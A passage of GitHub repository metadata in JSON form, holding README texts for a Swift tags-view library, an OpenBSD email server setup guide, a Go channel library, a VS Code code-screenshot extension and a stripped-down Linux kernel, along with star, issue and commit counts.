0)\n)\n```\n\ndone!\n\n<br><br><br>\n\n\n\n### Property\n\ntags\n\n```swift\n//Returned as an array of strings\ntagsView.tagTextArray//get-only\n\n//Returned as an array of TagButton\ntagsView.tagArray//get-only\n```\n\nheight\n\n```swift\ntagsView.height//get-only\n```\n\npadding & margin\n\n![image](./img/margin_padding.png)\n\n```swift\ntagsView.paddingLeftRight = 6\ntagsView.paddingTopBottom = 4\ntagsView.marginLeftRight = 6\ntagsView.marginTopBottom = 4\n```\n\n\ntag\n\n```swift\n// layer radius\ntagsView.tagLayerRadius = 6\n// layer width\ntagsView.tagLayerWidth = 1\n// layer color\ntagsView.tagLayerColor = .black\n// text color\ntagsView.tagTitleColor = .black\n// background color\ntagsView.tagBackgroundColor = .white\n// font\ntagsView.tagFont = .systemFont(ofSize: 15)\n// text longer ...\ntagsView.lineBreakMode = .byTruncatingMiddle\n// tag add\ntagsView.tags = \"Hello,Swift\"\n```\n\nlastTag\n\n```swift\n// lastTag title\ntagsView.lastTag = \"+\"\n// lastTag titleColor\ntagsView.lastTagTitleColor = .black\n// lastTag layer Color\ntagsView.lastTagLayerColor = .black\n// lastTag background Color\ntagsView.lastTagBackgroundColor = .white\n```\n\n<br><br>\n\n### Method\n\nappend\n\n```swift\ntagsView.append(\"Hello\")\ntagsView.append(contentsOf: [\"Hello\", \"World\"])\ntagsView.append(TagButton())\ntagsView.append(contentsOf: [TagButton(), TagButton()])\n```\n\nupdate\n\n```swift\ntagsView.update(\"Hi\", at: 0)\ntagsView.update(TagButton(), at: 0)\n```\n\ninsert\n\n```swift\ntagsView.insert(\"World\", at: 0)\ntagsView.insert(TagButton(), at: 0)\n```\n\nremove\n\n```swift\ntagsView.remove(0)\ntagsView.remove(TagButton())\ntagsView.removeAll()\n```\n\nlastTag\n\n```swift\n// lastTag Button\ntagsView.lastTagButton(TagButton())\n```\n\nredraw\n\n```swift\n// ReDraw\ntagsView.redraw()\n```\n\n<br><br>\n\n### Delegate\n\n```swift\nclass ViewController: UIViewController{\n    override func viewDidLoad() {\n        super.viewDidLoad()\n        \n        let tagsView = TagsView()\n        tagsView.delegate = self\n    }\n}\n\nextension ViewController: TagsDelegate{\n\n    // Tag Touch Action\n    func tagsTouchAction(_ tagsView: TagsView, tagButton: TagButton) {\n    \n    }\n    \n    // Last Tag Touch Action\n    func tagsLastTagAction(_ tagsView: TagsView, tagButton: TagButton) {\n    \n    }\n    \n    // TagsView Change Height\n    func tagsChangeHeight(_ tagsView: TagsView, height: CGFloat) {\n    \n    }\n}\n\n```\n\n<br><br>\n\n### Customize\n\nTagButton Customize\n\n```swift\nlet button = TagButton()\nbutton.setTitle(\"Tag\", for: .normal)\nlet options = ButtonOptions(\n    layerColor: UIColor.black, // layer Color\n    layerRadius: 6.0, // layer Radius\n    layerWidth: 1.0, // layer Width\n    tagTitleColor: UIColor.black, // title Color\n    tagFont: UIFont.systemFont(ofSize: 15), // Font\n    tagBackgroundColor: UIColor.white, // Background Color\n    lineBreakMode: NSLineBreakMode.byTruncatingMiddle //break Mode\n)\nbutton.setEntity(options)\ntagsView.append(button)\n```\n\nLastTagButton Customize\n\n```swift\nlet button = TagButton()\nbutton.setTitle(\"Tag\", for: .normal)\nlet options = ButtonOptions(\n    layerColor: UIColor.black, // layer Color\n    layerRadius: 6.0, // layer Radius\n    layerWidth: 1.0, // layer Width\n    tagTitleColor: UIColor.black, // title Color\n    tagFont: UIFont.systemFont(ofSize: 15), // Font\n    tagBackgroundColor: UIColor.white, // Background Color\n    lineBreakMode: NSLineBreakMode.byTruncatingMiddle //break Mode\n)\nbutton.setEntity(options)\ntagsView.lastTagButton(TagButton())\n```\n\n\n## Author\n\npikachu987, pikachu77769@gmail.com\n\n## License\n\nTags is available under the MIT license. See the LICENSE file for more info.\n","byteSize":5496},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":133},"createdAt":"2018-02-10T02:11:58Z","updatedAt":"2018-02-17T06:30:18Z","pushedAt":"2018-02-15T17:04:55Z","description":null,"subscribersCount":{"totalCount":5},"diskUsage":6982,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":1},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":1},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":8}}},"tags":{"totalCount":4},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"organization":{"login":"vedetta-com","repositories":{"totalCount":3},"location":null,"members":{"totalCount":0},"websiteUrl":""},"repository":{"name":"caesonia","primaryLanguage":{"name":"Shell"},"license":"BSD 2-Clause \"Simplified\" License","isArchived":false,"hasWikiEnabled":true,"forkCount":6,"readme_md":{"text":"# caesonia (beta)\n*Open*BSD Email Service\n\n![Public Domain](src/var/www/htdocs/mercury.example.com/Milonia_Caesonia-250x259.jpg)\n\n## About\n> a free-email alternative for ~$2.50/mo.\n\nRoot your Inbox :mailbox_with_mail:\n\n## Features\n- Efficient: configured to run on min. 512MB RAM and 20GB SSD, a KVM (cloud) VPS for around $2.50/mo\n- 15GB+ uncompressed Maildir, rivals top free-email providers (grow by upgrading SSD)\n- Email messages are gzip compressed, at least 1/3 more space with level 6 default\n- Server side full text search (headers and body) can be enabled (to use the extra space)\n- Mobile data friendly: IMAPS connections are compressed\n- Subaddress (+tag) support, to filter and monitor email addresses\n- Virtual domains, aliases, and credentials in files, Berkeley DB, or SQLite3\n- Naive Bayes rspamd filtering with supervised learning: the lowest false positive spam detection rates\n- Carefree automated Spam/ and Trash/ cleaning service (default: older than 30 days)\n- Automated quota management, gently assists when over quota\n- Easy backup MX setup: using the same configuration, install in minutes on a different host\n- Worry-free automated master/master replication with backup MX, prevents accidental loss of email messages\n- Resilient: the backup MX can be used as primary, even when the primary is not down, both perfect replicas\n- Flexible: switching roles is easy, making the process of changing VPS hosts a breeze (no downtime)\n- DMARC (with DKIM and SPF) email-validation system, to detect and prevent email spoofing\n- Daily (spartan) stats, to keep track of things\n- Your sieve scripts and managesieve configuration, let's get started\n\n## Considerations\nBy design, email message headers need to be public, for exchanges to happen. The body of the message can be encrypted by the user, if desired. Moreover, there is no way to prevent the host from having access to the virtual machine. Therefore, full disk encryption (at rest) may not be necessary.\n\nGiven our low memory requirements, and the single-purpose concept of email service, Roundcube or other web-based IMAP email clients should be on a different VPS.\n\nAntivirus software users (usually) have the service running on their devices. ClamAV can easily be incorporated into this configuration, if affected by the [types of malware](https://www.shadowserver.org/wiki/pmwiki.php/AV/Virus180-DayStats) it protects against, but will require around 1GB additional RAM (or another VPS).\n\nEvery email message is important, if properly delivered, for Bayes classification. At least 200 ham and 200 spam messages are required to learn what one considers junk. By default (change to use case), a rspamd score above 50% will send the message to Spam/. Moving messages in and out of Spam/ changes this score. After 95%, the message is flagged as \"seen\" and can be safely ignored.\n\nSpamd is effective at greylisting and stopping high volume spam, if it becomes a problem. It will be an option when IPv6 is supported, along with [bgp-spamd](https://bgp-spamd.net/).\n\nSystem mail is delivered to an alias mapped to a virtual user served by the service. This way, messages are guaranteed to be delivered via encrypted connection. It is not possible for real users to alias, nor `mail` an external mail address with the default configuration.\ne.g. puffy@mercury.example.com is wheel, with an alias mapped to (virtual) puffy@example.com, and user (puffy) can be different for each.\n\n## Getting started\nInstall packages:\n```sh\npkg_add dovecot dovecot-pigeonhole dkimproxy rspamd opensmtpd-extras\n```\nAdd users:\n```sh\nuseradd -m -u 2000 -g =uid -c \"Virtual Mail\" -d /var/vmail -s /sbin/nologin vmail\nuseradd -m -u 2001 -g =uid -c \"Dsync Replication\" -d /home/dsync -s /bin/sh dsync\n```\n## Cheatsheet\n#### A quick way around\nLet's assume we want to change the (default) virtual domain name from `example.net` to `example.org`\n```sh\ncd src/\ngrep -r example.net .\n```\nAfter close inspection\n```sh\nfind . -type f -exec sed -i 's|example.net|example.org|g' {} +\n```\n\n#### Defaults to customize\n```console\nprimary domain name: example.com\nvirtual domain name: example.com\n                     example.net\n\nprimary MX host: mercury.example.com\nprimary MX IPv4: 93.184.216.34\nprimary MX IPv6: 2606:2800:220:1:248:1893:25c8:1946\n\nbackup MX host: hermes.example.com\nbackup MX IPv4: 200.100.2.200\nbackup MX IPv6: 2001:1002:2:1::babe\n\nDKIM selector: obsd\nexternal (egress) interface: vio0\n\nwheel user: puffy\nreplication user: dsync\nvirtual user: puffy\n\nautoexpunge: autoexpunge\\ =\\ 30d\nquota: storage=15G\nfull text search: fts\nfull sync: replication_full_sync_interval\\ =\\ 1h\n```\n#### Layout\n\n| Filesystem | Mount       | Size    |\n|:---------- |:----------- | -------:|\n| a          | /           |    256M |\n| b          | /swap       |   1024M |\n| d          | /var/log    |    128M |\n| e          | /tmp        |   1024M |\n| f          | /usr        |   1024M |\n| g          | /usr/local  |    512M |\n| h          | /home       |      8M |\n| i          | /var        |       * |\n| *Total*    |             | **20G+**|\n\nDisklabel: [var/www/htdocs/mercury.example.com/disklabel.min](src/var/www/htdocs/mercury.example.com/disklabel.min)\n\nPermissions are described in [usr/local/bin/hier.sh](src/usr/local/bin/hier.sh)\n\nAnsible: [ansible-role-mailserver](https://github.com/gonzalo-/ansible-role-mailserver/)\n\n## Prerequisites\nA DNS name server (from a registrar, a free service, VPS host, or self-hosted) is required, which allows editing the following record types: A, AAAA, MX, CAA, TXT, SSHFP\n\n#### Forward-confirmed reverse DNS (FCrDNS)\nEach MX subdomain has record types A, and AAAA with the VPS IPv4, and IPv6:\n```console\nmercury.example.com.\t86400\tIN\tA\t93.184.216.34\nmercury.example.com.\t86400\tIN\tAAAA\t2606:2800:220:1:248:1893:25c8:1946\n```\nEach IPv4 and IPv6 has record type PTR with the MX subdomain (reverse DNS configured on VPS host):\n```console\n...6\t\t\t\tIN\tPTR \tmercury.example.com.\n```\nVerify:\n```sh\ndig +short mercury.example.com a\n> 93.184.216.34\ndig +short -x 93.184.216.34\n> mercury.example.com.\n\ndig +short mercury.example.com aaaa\n> 2606:2800:220:1:248:1893:25c8:1946\ndig +short -x 2606:2800:220:1:248:1893:25c8:1946\n> mercury.example.com.\n```\n\n#### MX\nEach domain has first priority MX record \"mercury.example.com\"\n\nEach domain has second priority MX record \"hermes.example.com\"\n```console\nexample.com.\t86400\tIN\tMX\t10 mercury.example.com.\nexample.com.\t86400\tIN\tMX\t20 hermes.example.com.\n```\n\n#### CAA\nPrimary domain name's CAA record sets \"letsencrypt.org\" as the only CA allowed to issue certificates:\n```console\nexample.com.\t86400\tIN\tCAA\t128 issue \"letsencrypt.org\"\nexample.com.\t86400\tIN\tCAA\t128 issuewild \";\"\n```\n\n#### SSHFP\nEach MX subdomain needs their hosts's SSHFP records:\n```sh\nssh-keygen -r mercury.example.com\n```\n```console\nmercury.example.com.\t86400\tIN\tSSHFP\t1 1 2...\nmercury.example.com.\t86400\tIN\tSSHFP\t1 2 5...\nmercury.example.com.\t86400\tIN\tSSHFP\t2 1 a...\nmercury.example.com.\t86400\tIN\tSSHFP\t2 2 c...\nmercury.example.com.\t86400\tIN\tSSHFP\t3 1 6...\nmercury.example.com.\t86400\tIN\tSSHFP\t3 2 8...\nmercury.example.com.\t86400\tIN\tSSHFP\t4 1 7...\nmercury.example.com.\t86400\tIN\tSSHFP\t4 2 a...\n```\n\n#### Sender Policy Framework (SFP)\nEach domain and subdomain needs a TXT record with SPF data:\n```console\nexample.com.\t\t86400\tIN\tTXT\t\"v=spf1 mx mx:example.com -all\"\nmercury.example.com.\t86400\tIN\tTXT\t\"v=spf1 a mx ip4:93.184.216.34 ip6:2606:2800:220:1:248:1893:25c8:194 -all\"\nhermes.example.com.\t86400\tIN\tTXT\t\"v=spf1 a mx ip4:200.100.2.200 ip6:2001:1002:2:1::/64 -all\"\nwww.example.com.\t86400\tIN\tTXT\t\"v=spf1 -all\"\n```\n\n#### Domain Keys Identified Mail (DKIM)\nGenerate a private and public key:\n```sh\nmkdir -p /etc/ssl/dkim/private\nchmod 750 /etc/ssl/dkim/private\n```\nSome web-interfaces only allow TXT record with max 1024 bits key:\n```sh\nopenssl genrsa -out /etc/ssl/dkim/private/private.key 1024\nopenssl rsa -in /etc/ssl/dkim/private/private.key -pubout -out /etc/ssl/dkim/public.key\nchgrp -R _dkimproxy /etc/ssl/dkim/private\nchmod 440 /etc/ssl/dkim/private/private.key\n```\nAdd public key in TXT record:\n```console\nobsd._domainkey.example.com.\t86400\tIN\tTXT\t\"v=DKIM1; k=rsa; p=M...\"\n\n```\n\n#### Domain-based Message Authentication, Reporting & Conformance (DMARC)\nEach domain name needs a TXT record for subdomain \"_dmarc\" with DMARC data:\n```console\n_dmarc.example.com.\t86400\tIN\tTXT\tv=DMARC1\\;p=reject\\;pct=100\\;rua=mailto:dmarcreports\\@example.com\n```\n\n## Support\nVia [issues](https://github.com/vedetta-com/caesonia/issues) and #openbsd:[matrix.org](https://matrix.org/)\n\n## Contribute\n:pray:\n","byteSize":8568},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":280},"createdAt":"2018-02-10T18:24:08Z","updatedAt":"2018-02-17T08:48:09Z","pushedAt":"2018-02-16T18:57:07Z","description":"OpenBSD Email Service","subscribersCount":{"totalCount":11},"diskUsage":131,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":28},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":5}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":2},"numCommits":{"target":{"history":{"totalCount":80}}},"tags":{"totalCount":1},"releases":{"totalCount":1},"type":"organization"},"siteAdmin":"false"},{"user":{"login":"tidwall","followers":{"totalCount":845},"repositories":{"totalCount":89},"following":{"totalCount":10},"location":"Tempe, AZ","organizations":{"totalCount":2},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":2},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":22},"websiteUrl":"http://twitter.com/tidwall"},"repository":{"name":"fastlane","primaryLanguage":{"name":"Go"},"license":"MIT License","isArchived":false,"hasWikiEnabled":true,"forkCount":4,"readme_md":{"text":"# `fastlane`\n\n[![Build Status](https://img.shields.io/travis/tidwall/fastlane.svg?style=flat-square)](https://travis-ci.org/tidwall/fastlane)\n[![GoDoc](https://img.shields.io/badge/api-reference-blue.svg?style=flat-square)](https://godoc.org/github.com/tidwall/fastlane)\n\n\nFast single-producer / single-consumer channels for Go.\n\nA fastlane channel works similar to a standard Go channel with the following exceptions:\n\n- It does not have a close method. A sender must send the receiver a custom close message.\n- It's unbounded and has no buffering. There's a lock-free list under the hood.\n- It expects to be communicating over a maximum of two goroutines. One for `Send` and one for `Recv`. \n\n# Getting Started\n\n### Installing\n\nTo start using fastlane, install Go and run `go get`:\n\n```sh\n$ go get -u github.com/tidwall/fastlane\n```\n\nThis will retrieve the library.\n\n### Usage\n\nThere're only two functions `Send` and `Recv`.\n\n```go\n// chan.go\npackage main\n\nimport \"github.com/tidwall/fastlane\"\n\nfunc main() {\n\tvar ch fastlane.Chan\n\n\tgo func() { ch.Send(\"ping\") }()\n\n\tv := ch.Recv()\n\tprintln(v.(string))\n}\n```\n\n```sh\n$ go run chan.go \nping\n```\n\n\n## Channel types\n\nThere's currently three types of channels, `Chan` for `interface{}`, `ChanUint64` for `uint64`, and `ChanPointer` for `unsafe.Pointer`.\n\nThe `ChanUint64` and `ChanPointer` often perform better than the generic `Chan` and should be used when possible.\n\nHere's a simple wrapper for creating a channel for sending a custom types as a pointer:\n\n```go\ntype MyType struct {\n\tHiya string\n}\n\ntype MyChan struct{ base fastlane.ChanPointer }\n\nfunc (ch *MyChan) Send(value *MyType) {\n\tch.base.Send(unsafe.Pointer(value))\n}\nfunc (ch *MyChan) Recv() *MyType {\n\treturn (*MyType)(ch.base.Recv())\n}\n```\n\n```go\nvar ch MyChan\n\ngo func() { ch.Send(&MyType{Hiya: \"howdy!\"}) }()\n\nv := ch.Recv()\nprintln(v.Hiya)\n```\n\n## Performance\n\nThe benchmark tests the speed of sending integers between two goroutines.\n\n```\n$ go test -run none -bench .\n``` \n\nMacBook Pro 15\" 2.8 GHz Intel Core i7 (darwin/amd64)\n\n```\nBenchmarkFastlaneChan-8       \t30000000\t        40.4 ns/op\nBenchmarkGoChan100-8          \t20000000\t        68.9 ns/op\nBenchmarkGoChan10-8           \t20000000\t        74.4 ns/op\nBenchmarkGoChanUnbuffered-8   \t10000000\t       197 ns/op\n```\n\nMac mini i7-3615QM CPU @ 2.30GHz (linux/amd64)\n\n```\nBenchmarkFastlaneChan-8       \t20000000\t        67.3 ns/op\nBenchmarkGoChan100-8          \t10000000\t       181 ns/op\nBenchmarkGoChan10-8           \t 5000000\t       223 ns/op\nBenchmarkGoChanUnbuffered-8   \t 5000000\t       595 ns/op\n```\n\nRaspberry Pi 3 (linux/arm64)\n\n```\nBenchmarkFastlaneChan-4       \t10000000\t       213 ns/op\nBenchmarkGoChan100-4          \t 3000000\t       406 ns/op\nBenchmarkGoChan10-4           \t 3000000\t       578 ns/op\nBenchmarkGoChanUnbuffered-4   \t 1000000\t      1405 ns/op\n```\n\nRaspberry Pi 3 (linux/arm)\n\n```\nBenchmarkFastlaneChan-4       \t 5000000\t       334 ns/op\nBenchmarkGoChan100-4          \t 2000000\t       669 ns/op\nBenchmarkGoChan10-4           \t 2000000\t       936 ns/op\nBenchmarkGoChanUnbuffered-4   \t 1000000\t      2370 ns/op\n```\n\n## Contact\n\nJosh Baker [@tidwall](http://twitter.com/tidwall)\n\n## License\n\n`fastlane` source code is available under the MIT [License](/LICENSE).\n\n","byteSize":3253},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":229},"createdAt":"2018-02-10T03:30:22Z","updatedAt":"2018-02-17T07:29:21Z","pushedAt":"2018-02-11T22:59:55Z","description":"Fast single-producer / single-consumer channels for Go","subscribersCount":{"totalCount":8},"diskUsage":21,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":1},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":11},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":9}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"79134054","followers":{"totalCount":10},"repositories":{"totalCount":1},"following":{"totalCount":0},"location":null,"organizations":{"totalCount":0},"gists":{"edges":[],"totalCount":0},"websiteUrl":null},"repository":{"name":"VSEninge2","primaryLanguage":{"name":"C++"},"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":39,"readme_md":null,"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":124},"createdAt":"2018-02-09T04:32:44Z","updatedAt":"2018-02-16T17:14:14Z","pushedAt":"2018-02-09T07:13:14Z","description":null,"subscribersCount":{"totalCount":22},"diskUsage":109066,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":2}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"octref","followers":{"totalCount":196},"repositories":{"totalCount":18},"following":{"totalCount":41},"location":"ヘルサレムズ・ロット","organizations":{"totalCount":1},"gists":{"edges":[],"totalCount":0},"websiteUrl":""},"repository":{"name":"polacode","primaryLanguage":{"name":"HTML"},"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":5,"readme_md":{"text":"# Polacode\n\nPolaroid for your code 📸.\n\n[MarketPlace Page](https://marketplace.visualstudio.com/items?itemName=pnp.polacode)\n\n![usage](https://github.com/octref/polacode/raw/master/demo/usage.gif)\n\nBy [Pine](https://github.com/octref) & [Peng](https://github.com/rebornix) from VS Code team.\nHappy Coding!\n\n## Why?\n\nYou have spent countless hours finding the perfect [JavaScript grammar](https://marketplace.visualstudio.com/search?term=javascript%20grammar&target=VSCode&category=All%20categories&sortBy=Relevance), matching it with a [sleek-looking VS Code theme](https://marketplace.visualstudio.com/search?target=VSCode&category=Themes&sortBy=Downloads), trying out all the [best programming fonts](https://www.slant.co/topics/67/~best-programming-fonts).\n\nYou take three days porting over [your theme](https://github.com/wesbos/cobalt2-vscode) before starting to use VS Code.\nYou shell out $200 for italic cursive html attributes.\n\nThe code has to look right.\n\n## Seriously, why not just take a screenshot?\n\n- I like and care about the shadow, padding & rounded corner of macOS's screenshot. I want it to be available for my code snippet too. You can't select a part of your code and easily get all these nice visuals with macOS's Grab tool.\n- I want to hide errors, warnings, color decorators, folding markers, line numbers, scrollbar and minimap.\n- It generates something decent on Windows & Linux.\n\n## Demo\n\n[Nord](https://github.com/arcticicestudio/nord-visual-studio-code) + [Input Mono](http://input.fontbureau.com)\n\n![demo1](https://raw.githubusercontent.com/octref/polacode/master/demo/1.png)\n\n[Monokai Pro](https://marketplace.visualstudio.com/items?itemName=monokai.theme-monokai-pro-vscode) + [Operator Mono](https://www.typography.com/blog/introducing-operator)\n\n![demo2](https://raw.githubusercontent.com/octref/polacode/master/demo/2.png)\n\n[Material Theme Palenight](https://marketplace.visualstudio.com/items?itemName=Equinusocio.vsc-material-theme) + [Fira Code](https://github.com/tonsky/FiraCode)\n\n![demo3](https://raw.githubusercontent.com/octref/polacode/master/demo/3.png)\n\n## Tip\n\n- If you have the Vim extension, remove its keybinding for copying. Otherwise VS Code won't copy code with syntax highlighting. Alternatively you can run the command `Copy with Syntax Highlighting`.\n- When running out of horizontal space, try the command `View: Toggle Editor Group Vertical/Horizontal Layout`.\n\n## Credit\n\nThanks to [@tsayen](https://github.com/tsayen) for making [dom-to-image](https://github.com/tsayen/dom-to-image), which Polacode is using for generating the images.\n\nThanks to [Dawn Labs](https://dawnlabs.io) for making [Carbon](https://carbon.now.sh) that inspired Polacode.\n\nDownload button animation is made with [Vivus](https://github.com/maxwellito/vivus).\n\n## License\n\nMIT","byteSize":2811},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":921},"createdAt":"2018-02-09T23:10:07Z","updatedAt":"2018-02-17T08:47:07Z","pushedAt":"2018-02-16T23:07:29Z","description":"📸 Polaroid for your code","subscribersCount":{"totalCount":6},"diskUsage":10212,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":1},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":1},"commits":{"totalCount":2}}}]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":14},"issuesClosed":{"totalCount":6},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":9},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":7},"participants":{"totalCount":4}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":4}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":0},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":5},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":41}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"liva","followers":{"totalCount":29},"repositories":{"totalCount":7},"following":{"totalCount":1},"location":null,"organizations":{"totalCount":2},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":2},"websiteUrl":""},"repository":{"name":"minimal-linux","primaryLanguage":{"name":"C"},"license":"Other","isArchived":false,"hasWikiEnabled":true,"forkCount":3,"readme_md":{"text":"# minimal linux\n\n## What's this?\n\nThis is the stripped version of linux kernel for learning.\n\nFeatures are\n* fast compilation (only takes 20 seconds on Xeon E3-1275 v5 @ 3.60GHz)\n* less source files (almost 900 .c files)\n\nLimitations are\n* only works on x86_64 QEMU\n* only supports 8250 serial driver\n\n## compilation\n\nuse 'minimalconfig' for configuration. DO NOT GENERATE '.config' FROM 'make' COMMANDS!\n\n```\n$ cp minimalconfig .config\n$ make -j8 bzImage\n```\n\n## make 